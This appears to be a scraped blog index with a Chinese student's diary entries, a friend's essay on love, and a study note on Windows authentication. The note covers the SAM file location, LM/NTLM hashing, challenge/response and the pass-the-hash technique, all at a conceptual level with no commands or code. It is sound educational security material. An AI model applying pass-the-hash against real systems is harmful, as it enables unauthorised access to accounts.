莓酱了。\n7.16\n第一，不要把茼蒿看成香菜。\n第二，不要试图在任何菜里加入剩菜，否则就会变成乱炖。\n第三，我今天做了个西式番茄乱炖。\n（还好味道可以）\n7.13-15\napex\n青椒炒肉，反正比学校食堂做的好吃。\n徒手掏青椒，留下了一整天的回忆。\n7.12\n和杰杰打通了个马里奥/奥德赛，蹭了他的进度hhh。\n7.11\n和节操樱花爽K爽吃\n7.10\n探望老人，说实话，我真的没想到会这样，顺其自然吧。\n7.9\n我现在在回大连的飞机上。\n下午六点从宿舍出发，公交，地铁2号转14号到机场，满打满算2小时40分钟，飞机9：35起飞。匆匆忙忙过去取了票，过安检的时候包里还有个做实验时候没取出来的钳子，直接送机场了。第一次看错登机口，赶到的时候才开始登机五分钟，还好。再一看，好家伙，晚点了。\n最近两天感觉是连起来的，不，或者是最近三周，是连起来的。两周时间课设和实验，一周半时间考试，只有这段时间才算是干了些正了八经电信专业的事吧。\n7.9上午考通原，7.8一整天加通宵学通原，从0到60，最后还不知道能不能过。\n7.7，英语和管理学，管理学也是从头开始背的。\n7.6，数电，还行，但是选择忘填空里了，不知道算不算分。\n好像没啥特别强的欲望，这三周的半折磨半放假的生活让我感觉不是没有啥想法，而是不想有啥想法。\n不管怎么说，回家了，许多想做的事又能开始了，许多想见的人也能见到了。下次开学，大三！再见李文科！再见李文科喵！\n先从剪个头开始吧！\n7.5\n舍友锐评国际象棋：感觉几步就能把地图走完了。\n7.4\n记得，当时玩《海姆达尔》的时候，人类有两个结局，第1个是利用海姆达尔的模拟与\n计算，成功登陆火星，第二个是还停留在地球上，沉迷虚拟世界。\n我不希望人一直停留在信息的茧房里，要像个骑士一样，面对真实的自我，面对真实的世界。\n（完全不知道为什么自己一读科幻小说就停不下来啊）\n7.3\n下午花两个小时把莱茵生命漫画看完了。赫默原来这么可爱，我一直以为她人设是昏昏沉沉的黎博利哈哈哈。以及，你永远可以相信塞爹。\n标记了\n《暮光之城》\n《秒速五厘米》\n中国科幻银河奖历年作品\n《看得见的女孩》\n我为了看懂b站上一个两分钟的视频，补了一部番？看得见的剑魔！看得见的，亚托克斯！\n魂芳白，太乙垂怜。\n7.2\n文明：太空，自定义mod，晚上LOL五黑\n晚上的晚上重读了一遍刘慈欣的《中国2185》，节选一段。\n\u0026ldquo;我是\u0026laquo;中央日报\u0026raquo;记者, 您刚才对\u0026laquo;时代周刊\u0026raquo;所说的话是否意味着您是凭魅力当选的?\u0026rdquo;\n\u0026ldquo;人民总是选择他们喜欢的人作为领导者, 这个国家的老一辈和新一代人都喜欢我, 我真高兴. \u0026quot;\n\u0026ldquo;这话是否暗示着您对自己的使命缺乏信心?\u0026rdquo;\n\u0026ldquo;领导者的信心来自于人民. 现在, 二十亿人民在看着我, 我想同每个人握手, 握二十亿次. 现在我看不见你们, 但你们在我的脑海中化成了两个形象, 这两个形象来自我收藏的二十世纪八十年代的两幅油画. 其中的一幅叫\u0026laquo;父亲\u0026raquo;, 一个黄土高原上老农民的头部占满了画面. 烈日把他的脸晒得像黑人, 黄土地上长年的贫穷劳累酷暑严寒给这张脸刻上了一道道深沟, 还有那双眼睛, 那是怎样一双眼睛啊, 呆滞中含着善良, 迷茫中透出渴望,那眼睛使我的心发颤. 另一幅叫\u0026laquo;战争年代\u0026raquo;, 画面上是一个瘦弱得不能再瘦弱的老大娘, 黑黑的草屋中只有她那一头白发反射着一丝亮光, 我曾在画布上仔细地找, 发现那头发找不到一根黑的. 看不到她的眼睛, 因为这双眼睛紧贴到手中正在做的一双布鞋上. 她的像干柴一样的手吃力地抓着布鞋, 身子弯曲着, 似乎永远直不起来. 她好像在把自己的全部生命都缝进那双布鞋. 那是为战场上的士兵做的鞋, 那些士兵当时正在这块士地上为共和国的诞生而战斗.\u0026rdquo;\n\u0026ldquo;\u0026laquo;人民日报\u0026raquo;记者. 用共和国最贫穷最落后时代的两个形象来代表今天的人民, 您认为合适吗?\u0026rdquo;\n\u0026ldquo;也许不合适, 但我心目中今天的人民仍然凝聚成这两个形象. 今天共和国的昌盛和强大是那个时代无法比拟的, 但历史的重负仍压在人民身上, 在我们面临的种种问题和困境中, 我们向着未来和理想举步艰难.\u0026rdquo;\n7.1\n文明：太空，潮起\n","date":"2022-08-14T23:15:24+08:00","permalink":"https://proben1.github.io/2022/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%972022.7/","title":"茄科生物观测日志2022.7"},{"content":"2022.6\n6.30\n计时模块：牺牲74LS161一片，555一片\n抢答模块：牺牲数码管一块\n信号模块：牺牲LED两支，黄色绿色\n完成，难忘，数电，课设，通原，考试，面包板，示波器，见一个，砸一个 。\n6.28\n这两天是不是和布线杠上了\n戴森球要布线，课设也要布线，一天16小时布线\n6.26\n西安，中雨\n假如什么事都可以放下，什么事都可以放过自己，那么这样的人生，又有什么意思呢？这样的成长又有什么意义呢！\n李莫寻找种子的那时候，很感动，但是没有哭。看到艾妲花海的时候，很感动，也没有哭。我不知道为什么，可能是因为我想哭一场吧，罢了。二向无常，往而无遇。对我印象最深的，是当我知道，老年李莫在白龙的时候，回想起他经过的一个个物品，是她亲手放好的。假如当时艾妲预先设置了逃生舱，和李莫拉米亚一起被救下，不就是HE了吗，我知道，但是我只是想要个庸俗的大团圆结局啊。\n睡前我在想，为什么会有种温柔的悲伤，这可能就是爱情的浪漫吧。\n我想说的是，关于这些作品里的刀，我们完全可以这样来看：游戏给我提供了一个新的世界，角色们则是一个个新的人设，他们的故事，我们完全可以自己想象，自己构造，剧本只是提供了导演想要表现的一种解读。比如说，如果没有艾妲的牺牲，她实现自己追求可能就在66标准年后了，也没有了李莫66年的思念，少了浪漫，少了刻骨铭心，少了游戏带来的现实效益。而我们，我们的想象无需拘泥于现实，我们只需要构造出一个三人及时放弃红楼，艾妲看开自己，选择了现在与她相伴的二人，成功全部获救，66年后再回到白龙的happy end就好。\n记住了，我欠这游戏一次泪水。但是，这不妨碍我欣赏这爱情的太空歌剧\n太空歌剧，《龙脉常歌》\n万道龙守，唯歌而动；\n二向无常，遇而无往。\n“你有认真看过货舱的种子堆吗？”\n“里面有一种花，叫做艾妲拉姆”\n“花语是\u0026hellip;请原谅我”\n花开有时，来世再遇。\n6.26\n平平淡淡，也平平安安的一周。\nsteam夏促，买了《戴森球计划》，《龙脉常歌》，还预计补下《文明：太空》和《全面战争模拟器》，《杀戮尖塔》。\n晚上会玩玩MC和csgo，返璞归真了。\n数电课设的电路一切都很完美，也是动的，可就是不按照我想象的去动。麻了。\n花了点时间把数电学完，现在在纠结通原怎么学啊。。。\n昨天正在那设计电路突然一个面试打过来，给我吓嘛了，hvv的，啥也没准备，定了个最低的。\n沉迷taffy这两天，变成了雏草姬的形状。\n推了《龙脉》的前两章，喜欢科技+中华传统元素的搭配，从RA3的神州到瀛海的太空站，比起纯的科技风，多了一份人定胜天的决心，一份对传统的敬畏。还有类似“二向无常，遇而无往”，“太乙垂怜，魂归瀛海日照”，“烛龙在上，万道日常”，“后土行歌，万道常在”这种信仰类的开场白，也十分让我触动。在这种万神信仰的宗教背景下，以及中式科幻风的物理背景下，空灵的歌声，壮阔的歌声，悲伤的歌声，沙哑的歌声，触动灵魂，仿佛汜就在眼前。\n开头倒叙给我一种很不好的预感\n6.22\n数电课设摸鱼通关了《Deliver Us The Moon》\n游戏场景很喜欢，太空站与月面基地的科技感拉满，从落地窗向外看，银灰色的月土无垠，再加上主人公的使命和孤单的背景音乐，有一种苍凉的美感。太空站里的游戏感受也很nice，有刺激有平淡。\n并没有感受到卖点里的孤独，可能是小AEC太可爱了，对比下《深海迷航1》，或者MC单人模式，或者现实，孤独都是来自不经意之间的，个人认为《Deliver》里的主角全是完成使命的充实感，没到孤独的那种境界。\n虽然很酷炫，但是剧情太，，，烂，很多地方逻辑都不自洽，不剧透了。不过最后主角还是让我小小的感动了一下。\n6.20\n王英豪说要做一个关于华山野猴的视频，我感觉还是有点不对劲哈。\n数电课设，先从学数电开始吧。话说这周慢慢早早起，计划早上去网协，下午上课，晚上宿舍开玩。\n6.19\n爬完华山回来的第二天，状态恢复啦！\n晚上看完了《派对》的结局，还是很不错的，但是没有英子和Kabe的合唱我不是很认可啊hhh\n6.13\n早上起来skip了通原以及通原签到，上午毛概画书不想逃，下午英语考听力逃不了。最后一周上课了，就好好点吧。\n晚上打蚊子，心力交猝。\n6.12\n对答案，发现六级听力错了一半。。。最后估计能擦边过。\n看了windows认证，kerberos，黄金白银票据，aouth2。。。的概念以及流程。\n送大四毕业，吃饭。尴尬的是，每个人都好饿，加上上菜慢。导致一盘菜上来13个人盯着看，刚刚每个菜还有渣，转了一圈每个菜连渣都没了。服务员：今晚盘子好洗。\n晚上mc超难拔刀匠魂极端天气模组联机，最可怕的是飓风+血月。\n6.11\n考六级前，想了个奇怪的问题，比如听力一半收音机没电了怎么办。想想还是算了，哪有赌狗一直输，我赌这个电池没事。\n前两天一个朋友给我分享了everything\u0026rsquo;s alright这首歌，是鹰角在我们那年高考后发布的，很遗憾，我竟然现在才知道这个事情。高中的遗憾似乎就高考没考好这一点吧，大学的可多了去了。\n这里尤其点名批评疫情，疫情里的大学生狗都不如。前两天一个朋给我推了一个贵阳的培训，三天，恩，我训人那种，没敢去，导员说出去可以，但是回来要学校统一规定，怕赶不上期末考试。昨天又一个大连的hvv，时间没对上也没去。有点烦，为什么学校考试这么晚？大概率赶不上国hvv。\n想了一下假期实习的事情，在提前准备。要么整个小的hvv，时间短，到时候也回得来。或者直接在大连找一个公司去，三个月，下学期开学就不来了。当然我比较倾向的是两个人一起，毕竟很爽不是吗？具体情况还得问问导员，苗姐啊，给点力啊！！！\n这段时间整体来讲比较放松，天天打只狼和羽毛球。6级过完之后开始看面经找实习，复习期末，就又过了一学期。\n如果没疫情的话，大学里我希望多出去走一走，就那种这四处找点网安的临时的活，时间短点，半个月或一个月，然后空闲的时间在这个城市里转一转，结束的时候再去一些景区旅个游什么的，想象的倒是很不错。\n我很喜欢zc的一点就是她好热爱自己的生活，小时候我可能比较恨，现在的我既不爱也不恨，所以有些不上心。以后我希望自己能越来越爱自己吧。毕竟这样才能在精神上和她站在一起。\n感觉我是夹在卷摆两者中间的，就时不时找点事干，然后受打击之后躺平一会儿，歇好了继续找事干。看似好像什么都得不到，实际上又都得到了一点，感觉还可以，反正挺满足的。\n最近做了一些梦，全都是关于恋爱的。但是。。。怎么说呢，可能，让我三观尽毁。我想了想还是发出来吧，放到隐藏里。\n6.8\n尝试去打麦，回来的时候看了一个天坛，然后骑了共享单车回宿舍。\n太吓人了，城市自行车驾龄+1.5h，含金量刚刚的。\n以后想找刺激就去城市里骑自行车，肉包铁，记得先买份保险。\n看了《精灵旅社》，zing!\n6.7\n今天管理学课上老师放了个斯坦福大学的视频，然后我突然有一个想法，就是怎么才能进到斯坦福大学上学。后来一搜好像前年毕业的才40多个中国内陆的，遂放弃。不过又突然有了斗志，斯坦福我上不了研究生总要考上吧，考到哪个城市就有能有机会去哪里好好玩玩。\n所以现在赶紧玩！赶紧把西安能好好玩的地方都玩个遍，怕以后没啥机会再回来。还有两年来得及。\n南京同理嘿嘿嘿。\n14：00-16：30 数电坐牢\n17：30-18：30 振刀苇名屑一郎\n20：00-22：30 出去打羽毛球\n00：00-次日7：30 打呼噜\n6.6\n人的精力是有限的，感受到了。当时我连打了两个小时羽毛球，回宿舍再高强度拉和振刀，已经到了把视角从a大拖到中路都费劲的地步了，r8准星离人都两三个身位）\n躺在床上，一阵眩晕，感觉是晕过去的，而不是睡着的。\n（补，舍友说那天晚上睡得老香了，都在问谁在装修啊）\n6.4\n泡面的时候把叉子一块泡了，剪调料袋的时候没意识到是对着泡面桶剪的，等我把塑料咽下去的时候才想到这个事情。\n6.3\n莫名其妙被拉到图书馆做六级的模拟题比拼一下，结果发现俩人莫得同一套卷子，最后变成了自己做互相批。。。\n今日单词：\n学习180，复习190\n6.2\n玉玉了\n别人玉玉是在晚上\n我玉玉可以在早上\n早上起来是29°的晴天，生活委员催着核酸\n忘记了昨晚的狂欢，原来不喝酒也会有醉宿的感觉\n毛概老师这么说，每天不要白来，学到点东西，到时候把书给母亲看 让她知道你在学校都学了什么\n我笑了，我说教材从来不带回家\n以后毕业发个说说，就说我进美团了，终于进了个甲方的公司\n如果有人羡慕，我会说这个工作每天不坐办公室，可以在城市里四处转转\n原来不是安全工程师，而是外卖骑手\n信息时代的人们都有点浮躁，干什么事情都是一知半解，摆烂也是如此。\n摆了一节课，我一半时间是用深情而低沉的眼神望着前面女生的椰树牌椰汁，那是自己目前最想得到缺得不到的东西\n每次摆烂完，我都觉得自己的人生又度过了一个轮回：目标，努力，摆烂。就像是我每次搓内裤时都会想，这学期还要搓多少次裤头呢？人生又有多少次摆烂呢？\n下课了，女生把椰汁扔进了垃圾桶里。\n今日单词：\n学习81，复习400\n6.1\n省赛，第十\n今日单词：\n学习165，复习493\n","date":"2022-08-14T23:15:18+08:00","permalink":"https://proben1.github.io/2022/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%972022.6/","title":"茄科生物观测日志2022.6"},{"content":"华山 2022.6.16-6.17\n金乌腾晓，日出扶桑。\n——RA3日冕mod神州阵营金乌轰战机出厂音效\n准备 咱们认为 有时候找不到同伴 自己前行也无妨\n今年六月份免票，但是从玉泉院的步行票要抢，我抢不到所以买了个16号下午的北峰缆车线路的票。\n物品：身份证，学生证，口罩，一些现金，面包，牛奶，水，手套，耳机，转换头，充电线，充电宝（手机5000mAh的设计电池容量借了舍友的20000mAh充电宝，最后直接用干了）\n需要核酸证明，西安市的手机上一码通那种就行。 西安工会医院，混检，但是1.0人，3.4元，支付宝随机立减之后2.98，然后，做完就发现学校发了个明天统一核酸的信息。我是sillyB。\n天气：华山风景名胜区，微博\n买票：华山旅游服务平台，微信\n额外信息：上贴吧搜的，华山吧吧主的微信区，加进去可以寻找旅友，收集一些信息也很方便。\n路线：10点宿舍出发，吃饭做核酸，10:50到学校北门，12：20到达西安北站（地铁二号线太顶了，直接25km从南到北，油门到底），12：50上车，13：30下车，等公交到生态中心50min)大概14：30分到达，乘坐旅行车进入北峰缆车口（20min），16：00之前买票上缆车。然后，卡其脱离太！什么都不要想，直奔西峰看日落。 晚上去东峰，睡觉看日出，最后通过南峰返回西峰，做缆车下山。\n出发 复兴号，很帅气，橙黑色的流线车头，整体二西莫夫风。车内灯光明亮，加上橙光，会有温馨的感觉。全车空调和wifi覆盖，二等座的位置也很宽敞。运行十分平稳，尤其是启动的时候，虽然竖硬币不至于，但体验感++。路过灞河，窗外是西安的城郊，大平原，从工厂林立到麦田滚滚，是真的一望无际。车速很快，88km，大概26-28min，好家伙，渭南什么时候过的我的没发现。 一直在往北看农田，回头一看吓一跳，华山好大一坨。\n等了半天华阴1路，来了个空调公交车，一人2块立马发车，师傅直接卡其脱离太。暴躁模式，打鸣公交车。直接到游客中心。\n山下吃了个凉皮肉夹馍冰峰25 ，个人认为是陕西最经典的套餐之一。虽然他的肉夹馍有点硬，凉皮也比较少， 奈何很对我口味，一直说好吃，走的时候差点忘付钱了hhh。\n15：00坐完缆车 ，开始登山。路上什么样的人都有（没看到小孩），甚至还有被人搀扶着的拄拐杖的老奶奶和残疾人。比预计的快很多，大概下午五点多就到西峰顶了，日落还在八点，于是我找了个观景很好的石头小窝，躺着享受阳光与风景。\n日落 在等日落的那段时间，真的是人生中最幸福的时刻之一。无尽的山，无尽的平原，躺到一个小坑，旁边是结实的护栏，背对着太阳，想着这个时候背单词应该很酷吧。打开了软件，发现锁屏上给我推的是horizon。\n照了会儿照片，我想着在学校的时候，我夕阳最喜欢点一首许嵩的《超市》听，当我插上耳机抬起头的那一刻，我看见了奇迹。\n没有相机可以拍出这样的场景，如果真的要形容的话，它应该是一个恒星大小的蜘蛛，日光是它的蛛身，八条扩散的光晕是它的腿脚，如同古神一般。我SAN值清零了一样，死死地盯着它，哪怕视野已经被成了直视太阳的紫色，这颜色绕着圈一圈一圈地扩散着，直到完全看不见，闭上了眼睛。那一刻我有一种翻过栅栏跳下华山的冲动，去拥抱太阳，拥抱这神迹。\n最后太阳被地平线吞噬了。慢慢享受吧，仅仅是这一个时刻给这一天赋予了意义，也为你的人生添加了意义。\n日出 西峰晚上清山， 我被迫要换个地方 ，换好衣服全副武装，确保除了必要外，其他部位全部不露出。 考虑到安全，我决定原路返回去，回到西峰索道顺道到中峰看一眼去东峰，走小树林这条线啊，没有掉下去的风险。夜爬华山，开始！你给路打油！\n路上一边顺着灯光和小帐篷，一边听着许嵩的歌。听到兴起还会唱两句。一般只有我一个人，所以我唱的很带劲儿，除了这个还会跟微信朋友们吐槽吐槽。\n晚上睡在三个帐篷构成的小坑里，还可以。没错，是左，右，前有三个帐篷，我在外面hhh，风很大，我尽量把衣服覆盖到全身，保证晚上不被风扫到。晚上躺着打方舟的ex关，华山论舰，可惜打一半没理智了。红色的月亮，慢慢变成金黄，又褪成白色，伴着希希散散的星星，山顶的烈风，还有一声声“刮跑啦！”，静静待着明天，期待那一句，金乌腾晓，日出扶桑。\n顺便提一下，100多人一块睡觉，实在是太sb了，尤其是年轻人居多的情况下，两点多还有人在嗷嗷直叫。\n迷迷糊糊的一晚上，3：40，起来了，感觉天空有什么在一点一点的，戴上眼镜发现是群星。遗憾实在是太微薄了，手机拍不了。很浪漫，因为真的是满天都是。\n抢到了个第二排hhh ，前面是俩高考完出来玩的高中妹子（还帮她们拍了个合影），所以看的很清楚。日出对比日落我觉得多了些人性，少了些神性。地平线先是一摸橙红的霞光 ，渐渐能看得清底下的山脉，山下的灯火熄灭，换来的是一望无尽的平原与河流。太阳露头的那一刻，人群中传来惊叹，我清楚地听到一位大爷说：这不似个大咸鸭蛋吗。还真是，只不过是红色的大咸鸭蛋。手机还是拍不了那种红色的光晕，只能多看看，刻在记忆里。\n完全升起后，颜色从红向金黄再向白色转变，如同一个朝气蓬勃的年轻人，神清气爽的哈，脱去外套，向南峰-\u0026gt;西峰出发。由于晚上睡眠时间太少了，再持续作战可能有些不安全，在早上八点多坐了西峰缆车下山。\n惊喜！我本来想过缆车里，我会邂逅一生的浪漫，我会遇到人生的导师，我会结拜异姓的兄弟，我会遇见甜蜜的情侣，可我没想到的是——这辆车就我一个，我变成了华山野猴。在里面疯狂自拍hhh。\n最后回学校了，除了中途公交车坐反了又坐会景区再没别的乱子了。在火车站旁边的餐馆遇到了一个刚艺考考完的高三哥们，好一顿唠嗑，在站里还遇到了看日出时前面的妹子，她们也是高考完出来的。\n一路上花个400出头，高铁54x2，缆车80+126，门票免费，进出山车20+40，保险10，正餐就吃了两顿，都没在山上吃，其他面包牛奶火腿肠。很棒的一次旅行，下次有机会一定从玉泉院爬上山！\n金乌腾晓，日出扶桑。\n","date":"2022-06-19T19:04:44+08:00","image":"https://proben1.github.io/2022/%E5%8D%8E%E5%B1%B1%E4%B8%A4%E6%97%A5%E6%B8%B8/%E6%89%B9%E6%B3%A8%202022-06-19%20201805_hu2a960d95d769cb380bf6d4c552143af4_272609_120x120_fill_box_smart1_3.png","permalink":"https://proben1.github.io/2022/%E5%8D%8E%E5%B1%B1%E4%B8%A4%E6%97%A5%E6%B8%B8/","title":"华山两日游"},{"content":"内网小白一枚，打算从一个个概念开始记\nWindows本地认证 SAM数据库 路径：%SystemRoot%\\system32\\config\\sam\n当我们登录系统的时候，系统会自动地读取SAM文件中的“密码”与我们输入的 “密码”进行比对，如果相同，证明认证成功。\nLAN Manager Hash LM Hash(LAN Manager Hash) 是windows最早用的加密算法，由IBM设计。LM Hash 使用硬编码秘钥的DES，且存在缺陷。早期的Windows系统如XP、Server 2003等使用LM Hash，而后的系统默认禁用了LM Hash并使用NTLM Hash。\n作为早期的算法，LM Hash存在着诸多问题：\n密码长度不会超过14字符，且不区分大小写 如果密码长度小于7位，后一组哈希的值确定，可以通过结尾为 aad3b435b51404ee 来判断密码长度不超过7位（可以看下分析） 分组加密极大程度降低了密码的复杂度 DES算法强度低 NT LAN Mangger Hash NTLM（NT LAN Mangger）Hash，也叫NT Hash，是支持Net NTLM认证协议(这个以后说)及本地认证过程中的一个重要参数。其长度为32位，由数字与字母组成。\nWindows本身不储存用户的明文密码，而是通过加密算法之后储存到SAM数据库里。当用户登录时，输入的密码也通过NTML Hash与SAM中的NTML Hash比较。\n生成算法\n明文转换为16进制ASCII码 使用little-endian(小端)序将其在转换为Unicode格式。0x80之前的标准ASCII码转换成Unicode码，就是简单地从0x??变成 0×00??。此类标准ASCII串按little-endian序转换成Unicode串，就是简单地在原有每个字节之后添加0×00 对所获取的 Unicode串进行标准MD4单向哈希，无论数据源有多少字节，MD4固定产生128-bit的哈希值 流程 winlogon.exe -\u0026gt; 接收用户输入 -\u0026gt; lsass.exe -\u0026gt; (认证) 首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，会将密码交给lsass进程，这个进程中会存一份明文密码，随后明文密码加密成NTLM Hash，对SAM数据库比较认证。\nWindows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。 LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。 Windows网络认证 工作组和域 工作组 Work Group 在Windows 9x/NT/2008就引用了“工作组”这个概念，将不同的电脑一般按功能分别列入不同的组中。\n你也可以退出某个工作组，只要将工作组名称改动即可。不过这样在网上别人照样可以访问你的共享资源，只不过换了一个工作组而已。你可以随便加入同一网络上的任何工作组，也可以离开一个工作组。“工作组”就像一个自由加入和退出的俱乐部一样，它本身的作用仅仅是提供一个“房间”，以方便网上计算机共享资源的浏览。\n工作组环境是一个逻辑上的网络环境，隶属于工作组的机器之间无法互相建 立一个完美的信任机制。\n假设A主机与B主机属于同一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能够访问B主机上的资源。\neg:445端口SMB服务\n域 Domain 与工作组的“松散会员制”有所不同，域”是一个相对严格的组织。“域”指的是服务器控制网络上的计算机能否加入的计算机组合。\n在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”。“域控制器”中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的。\nNTLM协议 SMB协议明文传输，于是有了LAN Manager Challenge/Response 验证机制，检查LM，但是也很容易被破解，于是微软提出了NTLM协议（现在有NTLMv2和Kerberos）\nNTLM采用一种质询/应答（Challenge/Response）消息交换模式。\nChalenge/Response Chalenge/Response模式企图不泄露明文口令本身就能证明客户机确实拥有正确的口令。\n协商：主要用于确认双方协议版本\n质询：ChalengeResponse\n验证：验证结果\n1.客户端向服务器发出认证请求； 2.认证服务器从用户数据库中查询用户是否是合法的用户，若不是，则不做进一步的处理； 3.认证服务器内部产生一个随机数，作为Challenge，发送给用户； 4.客户将口令和随机数合并，使用单向Hash函数 ( 例如MD5算法 ) 生成一个字节串作为Response； 5.认证服务器将Response与自己的计算结果比较，如两者相同，则通过一次认证，反之认证失败； 6.认证服务器通知客户端认证成功或失败 NTLMv2协议 NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不相同 。\n前者的Challenge为8位，后者为16位。\n前者使用的主要加密算法是DES，后者使用的主要加密算法是HMAC-MD5。\nPass The Hash 哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。\n当使用其他方式得到用户名对应的NTLM Hash时，可以对服务器给出的 Chanllenge加密，生成一个Response，来完成认证。也就避免了密码。\nLM Hash脆弱性分析（附） 将所有小写字母转换为大写字母 123ABC // 未达到7个字符 将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补 31323341424300000000000000 将密码分割为两组7个字节的块 \u0026gt;31323341424300 00000000000000 // 16进制 将每组转化为比特流，不足56Bit则在左边加0 31323341424300 -\u0026gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-\u0026gt; (补足56Bit) 00110001001100100011001101000001010000100100001100000000 将比特流按照7比特一组，分出8组，末尾加0 由于后者都为0，结果可想而知，那就都是0; 将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 KGS!@#$%为Key(0x4B47532140232425)，得到8个结果 ，每个 结果转换为16进制。 -\u0026gt; 0011000010011000100011000110100000010100000100100000110000000000 -\u0026gt;30988C6814120C00 -\u0026gt; DES(30988C6814120C00) -\u0026gt; 48-D7-EB-91- 2F-5E-69-7C 由于我们的密码不超过7字节，所以后面的一半是固定的: AA-D3-B4-35-B5-14-04-EE 连接两个DES加密字符串。这是LM哈希。 48-D7-EB-91-2F-5E-69-7C-AA-D3-B4-35-B5-14-04-EE 参考：\nhttps://www.cnblogs.com/0d4y/p/12805112.html\nhttps://www.secpulse.com/archives/94848.html\nhttps://www.freebuf.com/articles/web/332190.html\n","date":"2022-06-13T13:37:17+08:00","permalink":"https://proben1.github.io/2022/%E7%90%86%E8%A7%A3windows%E8%AE%A4%E8%AF%81/","title":"理解Windows认证"},{"content":"作者：JokerUA\n突然想到了一段话，虽然我忘记了记忆的出处但格外令人印象深刻\n“为什么满足于绚烂而短暂的爱？” “我感受不到那种永恒的美，但，诗歌需要回车”\n我的一位朋友，因为他早期总用茄子作为头像，于是他的绰号是“茄子”，他在大学时突然发现自己对于自己的高中同学念念不忘，于是从各种渠道联系上了女同学。但如今他们已经分隔两地，即使成了一对也只能异地恋。 茄子跟我谈起这件事，我本想提醒他或许这段感情或许并没有好结果，但心中总有一个声音告诉我不要去干涉。或许这是他第一个可能处成的对象，又或许是不忍看他心中难过，也许只是认为即使说了也无济于事。 他们两个由原来的普通前同桌，逐渐关系拉进，茄子时不时会在群里发他和她的进展，而女方的反应似乎也很乐观。我知道，照这个进度下去，他们会成为一对。但以后呢？我不能妄下判断。\n或许是我自身的经历，我认为谈恋爱是一种麻烦事，它会占用你的时间金钱和精力，把你从一个人上帝的无拘无束加上一层镣铐。更何况，大部分的恋爱长远来看并没有好结果。这就转回了今天要讨论的问题: “为什么满足于绚烂而短暂的爱？” ——那么首先，为什么要爱？ 或许是一个人孤单久了需要陪伴，或许是当你老去能在世界遗留下什么，也或许只是荷尔蒙激素下催生的繁衍本能。 因为是爱，所以本身就是绚烂的，而因为爱情的性质，导致爱的短暂。所以，并非是因为绚烂而短暂的爱令人满足，而是人对于现状的一种妥协。因为短暂，因为无法改变，而又无法放下，所以“满足”。 那回答呢？ “我感受不到那种永恒的美” 永恒的美是一个伪命题，因为“美”来看，并没有什么是永恒的。即便如梵高这类绘画大家，他们的画作也是从某一个时间节点被大众接受，理所应当的，也会在未来被改变观念。所以这不是永恒的美。从美术延伸来看，九大艺术无不如此。于是第一句只是简单的陈述。 “但，诗歌需要回车” 这一句就很令人难以寻味，因为有“但”的转折存在，所以“诗歌需要回车”反而变成了一种“永恒的美”，的确正是因为回车将句子变短，才造就了一种结构上的诗意美。但是，这并不足以永恒。我本是这样想的。突然，一个新的思路清晰起来，短暂的并不是美的本身，而是美的衍生。或许《日出·印象》并不能够名传百世，满载盛誉，但美术这一概念本身却会永远传承下去，“印象派”总会衰落，而“后印象派”也会顺理成章的兴起。所以，短暂的是诗歌作品，却不是诗歌这种概念形式。“回车造就诗歌”，如果没有回车的存在，诗歌就变成了散文。 那“爱”呢？ 我认为，在当代几乎不会有人只会经历一段爱。一段长久而走到最后的爱是难以实现的，因为人总要在挫折中学会如何正确的爱一个人。爱一直会存在，只是所爱的对象或许会进行更替。爱的换行，也就是所描述的“回车”。\n毕竟，玫瑰无原则，心动至上。\n“为什么满足于绚烂而短暂的爱？” “我无法感受到那种永恒的美，但，诗歌需要回车”\n","date":"2022-06-13T13:29:32+08:00","permalink":"https://proben1.github.io/2022/2022.6.12%E8%8B%B1%E8%B1%AA%E8%B5%A0/","title":"2022.6.12英豪赠"},{"content":"2022.5\n6.1\n凌晨，0：42，读完《我们生活在南京》。\n天瑞老师的书，中国式的爱，信息的浪漫，20年的距离，以及，南京。\n以后，记得在月牙湖埋一个时间胶囊，就当是为了半夏。\n也就明白了我如同码头薯条一般的意义：\n1、找个心爱的女孩子\n2、维持和她在南京的生活\n自高考之后，从未如此清晰。至于她是谁，她怎样，用什么维持生活，什么样的生活，都是后话了。\n5.31\n22℃的西安，早上醒来，无汗，可以感受到身体的舒适和心情的愉悦。\n身体康复了。\n晚上和安全组的大家絮叨絮叨。\n调整了下单词的计划，打算先刷完核心词汇，比较简单，出现频率也更高。\n今日六级单词：\n学习：607\n复习：243\n5.30\n开摆上了一天课。\n今日六级单词：\n学习：130\n复习：190\n5.29\n鏖战一天，2022年全国大学生信息安全竞赛，MuReg7gW西邮第三，没有进入线下赛，其中队员dk带病且不带环境作战（乐）。\n正在谋划ctf的退役，重心也好久没放在这上了。\n打算给zc写封信，恩，顺便还可以给贾贾写点啥。\n今日六级单词：\n学习：30\n复习：199\n5.28\n在荒野的黑夜，面对未知，牵紧她的手。\n今日六级单词：\n学习：81\n复习：162\n5.27\n梦见晓旭老师了，很开心\n重装系统，还有驱动，等待的时候在跟着学校师傅偷师hhh。\n今日六级单词：\n学习：78\n复习：302\n5.26\n沙地沟的乔树林\n体测，引体向上12个！做完肚子肌肉疼hhh\n出发，调查联通卡一年700块钱的真相。\n调查地点：通院111\n调查结果：\n气死我了，前两天有个联通的客服给我打电话，说这边有一个加油包，让我确认收到短信就可以。\n结果她给我弄了一个月租100，50G的流量包，然后捆绑12个月，违约金还每个月8块。\n半句没提办理，元，人民币，费用，年限这些，开头就是为了回馈老用户。\n刚刚找了学校联通的站点，那有个巨强的阿姨，甚至和我导员一个名字，了解情况后直接开打，用强烈的态度和动不动就要投诉的语气，帮我给退了。感谢\n打算重装电脑系统了，难受，现在